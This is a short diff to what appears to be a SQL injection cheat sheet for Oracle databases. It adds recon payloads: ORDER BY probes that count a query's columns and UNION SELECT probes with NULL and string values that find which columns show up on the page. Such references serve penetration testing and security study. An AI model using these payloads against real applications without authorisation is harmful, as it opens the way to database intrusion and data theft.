@@ -134,11 +134,16 @@ SELECT table_name FROM (
 
 Recon Phase
 ```sql
-' ORDER BY 1--  
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--  
 ```
 Find number of columns using order by
 ```sql
 ' UNION SELECT NULL,NULL,NULL FROM DUAL--
+' UNION SELECT NULL,NULL,'c' FROM DUAL--
+' UNION SELECT NULL,'b',NULL FROM DUAL--
+' UNION SELECT 'a',NULL,NULL FROM DUAL--
 ```
 Find which column contain which datatype like string or integer and where they reflected in page
 
